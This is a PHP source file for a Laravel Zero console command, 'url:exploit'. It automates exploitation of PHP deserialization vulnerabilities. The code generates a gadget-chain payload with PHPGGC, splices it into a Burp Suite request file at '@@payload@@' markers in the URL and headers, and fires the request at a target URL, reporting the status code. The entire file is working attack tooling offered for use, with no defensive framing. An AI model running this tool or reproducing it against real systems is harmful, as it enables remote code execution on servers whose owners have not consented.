<?php

namespace App\Commands;

use Illuminate\Console\Scheduling\Schedule;
use LaravelZero\Framework\Commands\Command;
use GuzzleHttp\Client;

class UrlExploit extends Command
{
    protected $signature = 'url:exploit
                            { url : URL to exploit. }
                            { --b= : Passed to PHPGCC. }
                            { --request= : Request from BurpSuite to send. }
                            { params* : Parameters to pass to phpggc }';
    protected $description = 'Exploit serialization vulnerability using original request.';
    private $request;

    private function parseRequestFile($request, $url, $payload)
    {
        $requestData = file_get_contents($request);
        $parts = explode("\n\n", $requestData);
        $headers = explode("\n", $parts[0]);

        $firstHeader = $headers[0];
        unset($headers[0]);

        list($method, $uri) = explode(' ', $firstHeader);
        $data['method'] = $method;
        $data['url'] = str_replace('@@payload@@', $payload, $url . $uri);

        $data['headers'] = array();
        foreach ($headers as $header) {
            if (empty($header)) {
                continue;
            }

            list($key, $value) = explode(': ', $header);
            $value = str_replace('@@payload@@', $payload, $value);
            $data['headers'][$key] = $value;
        }

        $this->request = $data;
    }

    private function makeRequest()
    {
        $client = new Client();

        $response = $client->request(
            $this->request['method'],
            $this->request['url'],
            ['headers' => $this->request['headers']]
        );

        return $response->getStatusCode();
    }

    public function handle(): void
    {
        $url = $this->argument('url');
        $request = $this->option('request');

        $phpgcc = new \PHPGGC;

        # Fix argv to pass to phpggc
        global $argv;

        $argv[0] = './phpggc';
        unset($argv[1]);
        unset($argv[2]);

        foreach ($argv as $key => $value) {
            if (strpos($value, '--request', 0) === 0) {
                unset($argv[$key]);
                continue;
            }

            if (strpos($value, '--') === 0) {
                $argv[$key] = preg_replace('/^--/', '-', $value);
            }
        }

        ob_start();
        $phpgcc->generate();
        $payload = trim(ob_get_contents());
        ob_end_clean();

        $this->parseRequestFile($request, $url, $payload);
        $responseCode = $this->makeRequest();
        $this->info("Response code: $responseCode");
    }
}
